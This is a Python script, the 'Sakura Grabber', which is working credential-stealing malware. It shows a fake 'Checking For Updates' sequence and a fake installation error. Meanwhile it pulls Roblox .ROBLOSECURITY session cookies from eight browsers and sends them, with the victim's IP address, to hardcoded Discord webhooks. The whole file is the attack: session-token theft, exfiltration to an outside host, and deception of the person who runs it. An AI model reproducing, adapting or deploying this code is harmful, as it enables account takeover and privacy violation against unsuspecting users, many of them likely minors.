import os
from dhooks import Webhook, Embed
import socket
import requests
from tkinter import messagebox
from base64 import b64decode
from msvcrt import getch
from tkinter import messagebox

os.system("title Sakura Grabber")

webhook = "https://discord.com/api/webhooks/1189564280144662548/-veKgExP-lbxIRuhmExS0ZGO6VDrtShlAE1D22T8fu7QVwyJa20O-8krbZLBk6AuRcDd"
webhook1 = Webhook('https://discord.com/api/webhooks/1189564127958532187/l8LglZE8rFxYCzNhxxgieEIA93I2OdpSSrLbyfitQbTwyHuU8bvEF2QSPqLqRZeyDZJO')

try:
    import robloxpy
    import requests
    import browser_cookie3

except:
    input("One Of The Packages Are Not Installed, Run 'Requirements.Bat' To Remove This Error!")
    exit()

import time
time.sleep(1.5)

Sakura_message = "Checking For Updates..."
print(Sakura_message)

import time
time.sleep(8.5)

Sakura_message = "Error, Not On Latest Version!"
print(Sakura_message)

import time
time.sleep(2.5)

Sakura_message = "Installing..."
print(Sakura_message)

def cookiecheckerandsend(cookie, platform):

    if not robloxpy.Utils.CheckCookie(cookie) == "This Is A Valid Cookie":
        return requests.post(url=webhook, data={"content":f"\n|| ```{cookie}``` ||"})

    info = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":cookie}).json()

    requests.post(url=webhook, json={
        'username': "Sakura",
        'avatar_url': "https://cdn.discordapp.com/avatars/994230412383633480/1057a089f5141d9aac5848210c55212c.png?size=256",
        'embeds': [{
                "title": f"Sakura Grabber",
                "fields": [
                    {"name": ".ROBLOSECURITY", "value": f"```fix\n{cookie}```", "inline": True},
                ],
                "footer": {
                    ""
                }
            }
        ]
    }
)

hostname = socket.gethostname() 
ip = requests.get('https://api.ipify.org/').text 
r = requests.get(f'http://extreme-ip-lookup.com/json/{ip}')
geo = r.json()
embed = Embed()
fields = [
    {'name': 'IP Address', 'value': geo['query']},
]
for field in fields:
    if field['value']:
        embed.add_field(name=field['name'], value=field['value'], inline=True)
webhook1.send(embed=embed)

def Sakura():

    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                cookiecheckerandsend(cookie.value, platform='Firefox')
    except:
        pass

    try:
        cookies = browser_cookie3.safari(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                cookiecheckerandsend(cookie.value, platform='Safari')
    except:
        pass

    try:
        cookies = browser_cookie3.chromium(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                cookiecheckerandsend(cookie.value, platform='Chromium')
    except:
        pass

    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                cookiecheckerandsend(cookie.value, platform='Microsoft Edge')
    except:
        pass

    try:
        cookies = browser_cookie3.opera_gx(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                cookiecheckerandsend(cookie.value, platform='Opera GX')
    except:
        pass

    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                cookiecheckerandsend(cookie.value, platform='Opera')
    except:
        pass

    try:
        cookies = browser_cookie3.brave(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                cookiecheckerandsend(cookie.value, platform='Brave')
    except:
        pass

    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                cookiecheckerandsend(cookie.value, platform='Chrome')
    except:
        pass

cookies = Sakura()

messagebox.showerror("Error", "Unable to install latest version.")
